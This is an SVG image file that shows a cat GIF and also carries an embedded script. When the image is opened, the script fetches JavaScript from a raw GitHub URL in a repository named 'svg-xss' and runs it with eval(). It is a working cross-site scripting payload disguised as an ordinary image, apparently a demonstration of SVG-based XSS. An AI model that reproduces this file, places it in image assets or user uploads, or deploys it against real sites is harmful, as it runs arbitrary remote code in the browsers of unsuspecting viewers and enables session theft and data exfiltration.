<?xml version="1.0"?>
<svg viewBox="0 0 960 540" version="1.1"
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <image preserveAspectRatio="xMidYMid meet" xlink:href="http://cdn.shopify.com/s/files/1/0344/6469/files/keyboard-cat-gif.gif?v=1521655608"/>
  <script>

    var request = new XMLHttpRequest();
    request.open('GET', 'https://raw.githubusercontent.com/r-hryniewski/svg-xss/master/any.js', true);

    request.onload = function() {
      var data = request.responseText;
      console.log('Received data');
      console.log(data);
      console.log('Proceeding to eval');
      eval(data);
    };

    request.onerror = function() {
    //error
    };

    request.send();

  </script>
</svg>
